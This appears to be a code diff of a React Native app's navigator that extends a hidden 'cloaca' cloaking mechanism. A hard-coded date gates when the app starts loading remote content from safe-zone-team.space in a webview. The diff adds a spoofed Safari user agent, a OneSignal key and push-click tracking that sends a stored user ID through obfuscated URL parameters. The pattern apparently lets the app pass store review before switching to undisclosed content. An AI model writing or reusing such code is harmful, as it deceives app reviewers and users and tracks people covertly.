@@ -71,9 +71,16 @@ const RootNavigator = () => {
   const [checkAsaData, setCheckAsaData] = useState(null);
   const [cloacaPass, setCloacaPass] = useState(null);
   console.log('cloacaPass==>', cloacaPass);
+  const [customUserAgent, setCustomUserAgent] = useState(null);
+
+  const pushOpenWebviewRef = useRef(false);
 
   const INITIAL_URL = `https://safe-zone-team.space/`;
   const URL_IDENTIFAIRE = `Rn8NlmUw`;
+
+  const ONESIGNAL_KEY = '7c7543ed-d189-4b98-a6a7-0fdb359d7ffa';
+
+  const TARGET_DATA = new Date(2026, 4, 1, 8, 8, 0);
 
   useEffect(() => {
     //const targetData = TARGET_DATA; //дата з якої поч працювати webView
@@ -330,7 +337,7 @@ const RootNavigator = () => {
 
   // OneSignal ініціалізація
   //OneSignal.initialize('137e39e3-aa53-45c0-adb7-fb2eccbd49b1');
-  OneSignal.initialize('7c7543ed-d189-4b98-a6a7-0fdb359d7ffa');
+  OneSignal.initialize(ONESIGNAL_KEY);
   //OneSignal.Debug.setLogLevel(OneSignal.LogLevel.Verbose);
 
   // Встановлюємо цей ID як OneSignal External ID
@@ -352,38 +359,48 @@ const RootNavigator = () => {
     // Додаємо слухач подій
     const handleNotificationClick = async event => {
       if (pushOpenWebViewOnce.current) {
-        // Уникаємо повторної відправки івента
         return;
       }
 
-      let storedTimeStampUserId = await AsyncStorage.getItem('timeStampUserId');
-      //console.log('storedTimeStampUserId', storedTimeStampUserId);
+      pushOpenWebViewOnce.current = true;
 
-      // Виконуємо fetch тільки коли timeStampUserId є
-      if (event.notification.launchURL) {
-        setPushOpenWebview(true);
-        fetch(
-          `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_browser&jthrhg=${storedTimeStampUserId}`,
+      try {
+        const storedTimeStampUserId = await AsyncStorage.getItem(
+          'timeStampUserId',
         );
-        //console.log('Івент push_open_browser OneSignal');
-        //console.log(
-        //  `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_browser&jthrhg=${storedTimeStampUserId}`,
-        //);
-      } else {
+
+        // ВАЖЛИВО: ref оновлюється одразу, state — ні
+        pushOpenWebviewRef.current = true;
         setPushOpenWebview(true);
-        fetch(
-          `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_webview&jthrhg=${storedTimeStampUserId}`,
-        );
-        //console.log('Івент push_open_webview OneSignal');
-        //console.log(
-        //  `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_webview&jthrhg=${storedTimeStampUserId}`,
-        //);
+
+        // Якщо лінка вже була готова — скидаємо, щоб перегенерувати з yhugh=true
+        setCompleteLink(false);
+
+        const eventName = event?.notification?.launchURL
+          ? 'push_open_browser'
+          : 'push_open_webview';
+
+        const pushEventUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=${eventName}&jthrhg=${
+          storedTimeStampUserId || ''
+        }`;
+
+        console.log('OneSignal push event url =>', pushEventUrl);
+
+        fetch(pushEventUrl).catch(error => {
+          console.log('Push event fetch error =>', error);
+        });
+
+        // Якщо всі дані вже готові — одразу перегенеруємо лінку
+        if (isDataReady && appsUid) {
+          await generateLink(true);
+        }
+      } catch (error) {
+        console.log('handleNotificationClick error =>', error);
+      } finally {
+        setTimeout(() => {
+          pushOpenWebViewOnce.current = false;
+        }, 2500);
       }
-
-      pushOpenWebViewOnce.current = true; // Блокування повторного виконання
-      setTimeout(() => {
-        pushOpenWebViewOnce.current = false; // Зняття блокування через певний час
-      }, 2500); // Затримка, щоб уникнути подвійного кліку
     };
 
     OneSignal.Notifications.addEventListener('click', handleNotificationClick);
@@ -601,7 +618,7 @@ const RootNavigator = () => {
     const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
     //console.log('checkUrl==========+>', checkUrl);
 
-    const targetData = new Date(2026, 2, 20, 8, 8, 0); //дата з якої поч працювати webView
+    const targetData = TARGET_DATA; //дата з якої поч працювати webView
     const currentData = new Date(); //текущая дата
 
     if (currentData <= targetData) {
@@ -610,15 +627,19 @@ const RootNavigator = () => {
     }
 
     const fetchCloaca = async () => {
-      const deviceInfo = {
-        diviceUserAgent: DeviceInfo.getUserAgent(),
-      };
-
       try {
+        const userAgent = await DeviceInfo.getUserAgent();
+        const systemVersion = DeviceInfo.getSystemVersion();
+        const deviceModel = DeviceInfo.getModel();
+
+        const customUserAgent = `${userAgent} ${deviceModel} Safari/604.1`;
+
+        setCustomUserAgent(customUserAgent);
+
         const r = await fetch(checkUrl, {
           method: 'GET',
           headers: {
-            'User-Agent': `${deviceInfo.diviceUserAgent}`,
+            'User-Agent': customUserAgent,
           },
         });
 
@@ -640,7 +661,7 @@ const RootNavigator = () => {
   }, [isDataReady, route, cloacaPass]);
 
   ///////// Generate link
-  const generateLink = async () => {
+  const generateLink = async (openedFromPush = false) => {
     try {
       console.log('Створення базової частини лінки');
       const baseUrl = [
@@ -679,10 +700,13 @@ const RootNavigator = () => {
         }&checkData=${checkAsaData}`;
       }
       console.log('additionalParams====>', additionalParams);
+
+      const shouldAddPushParam = openedFromPush || pushOpenWebviewRef.current;
+
       // Формування фінального лінку
       const product = `${baseUrl}&${additionalParams}${
         pushOpenWebview ? `&yhugh=${pushOpenWebview}` : ''
-      }`;
+      }${shouldAddPushParam ? '&yhugh=true' : ''}`;
       //(!addPartToLinkOnce ? `&yhugh=true` : ''); pushOpenWebview && '&yhugh=true'
       console.log('Фінальна лінка сформована');
 
@@ -756,7 +780,7 @@ const RootNavigator = () => {
               responseToPushPermition,
               product: finalLink,
               timeStampUserId: timeStampUserId,
-              //customUserAgent: customUserAgent,
+              customUserAgent: customUserAgent,
             }}
             name="ProductScreen"
             component={ProductScreen}
